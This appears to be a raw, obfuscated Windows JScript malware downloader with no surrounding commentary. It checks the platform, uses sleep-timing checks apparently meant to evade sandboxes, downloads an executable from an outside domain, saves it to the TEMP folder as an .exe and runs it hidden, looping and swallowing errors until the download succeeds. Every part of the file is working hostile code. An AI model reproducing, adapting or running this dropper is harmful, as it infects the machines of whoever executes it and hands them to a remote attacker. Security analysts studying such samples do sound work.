var _R = false;
var _NA = "CreateObject";
var _B = function _LV() {return WScript[_NA]("WScript"+".Shell");}(), _YY = 11;
var _AZ = "MSXML2.XMLHTTP";
var _AH = 2123213;
var _BV = 0;
function _K(_BW){_B["Run"](_BW, _BV, _BV);};
function _UC(){return _AZ + "";};
function _UJ(_S1, _NB){_BV = _BV * 1; return _S1 - _NB;};
function _RY(){return _NA;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R = true;
  @end
@*/
if (_R)
{
var _J = "";
function _M2(){return 22;};
var _FJ = 0; var _S0 = 0;
function _M1()
{
var _BX = new this["Date"]();
var _O = _BX["getUTCMilliseconds"]();
WScript["Sleep"](_M2());
var _BX = new this["Date"]();
var _S = _BX["getUTCMilliseconds"]();
WScript["Sleep"](_M2());
var _BX = new this["Date"]();
var _X = _BX["getUTCMilliseconds"]();
var _FJ = "_IM";
_FJ = _UJ(_S, _O);
var _S0 = "_MH";
_S0 = _UJ(_X, _S);
_J = "open";
return _UJ(_FJ, _S0);
}
var _DP = false;
var _OF = false;
for (var _YR = _BV; _YR < _M2() * 1; _YR++){if (_M1() != _BV){
_DP = true; 
_S0 = "31" + 11 * _FJ + _S0; 
_OF = true; 
break;
}}
function _M() {return ((_DP == true) && (_DP == _OF)) ? 1 : _BV;};
if (_DP && _M() && _OF){
function _ZE() {return _B["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ixqmJDYrU0zd.ex" + "e";};
 _H = _UC();
 _R0 = WScript[_NA](_H);
 var _MZ = 1;
 while (_MZ){
try {
	if (_MZ == 1)
	{
		_R0[_J]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_R0["send"]();
		_I = "Sleep";
	}
	WScript[_I](_M2() + 120); 
	if (_R0["readystate"] < 2 * 2) continue;
	_MZ = _BV;
	function _M0(_PV) {var _SR = (1, 2, 3, 4, 5, _PV); return _SR;};
	_XU = WScript[_RY()]("ADODB.Stream");
	_H = _XU;
	_H[_J]();
	_H["type"] = _M0(1);
	_H["write"](_R0["ResponseBody"]);
	_XU["position"] = _M0(_BV);
	_H["Save" + "ToFile"](_ZE(), 2);
	_XU["cl"+"ose"]();
	_WI = _ZE();
	_K(_WI);
} catch(_L){};
}
}
}

